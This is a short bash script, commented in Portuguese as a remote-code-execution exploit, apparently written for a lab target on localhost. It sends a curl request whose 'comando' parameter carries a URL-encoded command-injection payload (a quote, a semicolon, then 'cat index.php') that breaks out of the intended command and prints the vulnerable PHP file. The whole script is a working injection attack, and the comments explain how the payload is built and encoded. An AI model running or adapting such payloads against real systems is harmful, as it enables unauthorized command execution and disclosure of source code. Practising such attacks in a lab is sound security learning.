#!/bin/bash
## exploit de RCE

## esse é o comando convertido em url, serve para exibir o conteudo do arquivo php vulnerável
## " ; cat index.php | tr -d "\n" #
## %22%20%3b%20cat%20index.php%20|%20tr%20-d%20%22%5cn%22%20%23

curl -s 'http://localhost:8080/?comando=google.com%22%20%3b%20cat%20index.php%20|%20tr%20-d%20%22%5cn%22%20%23'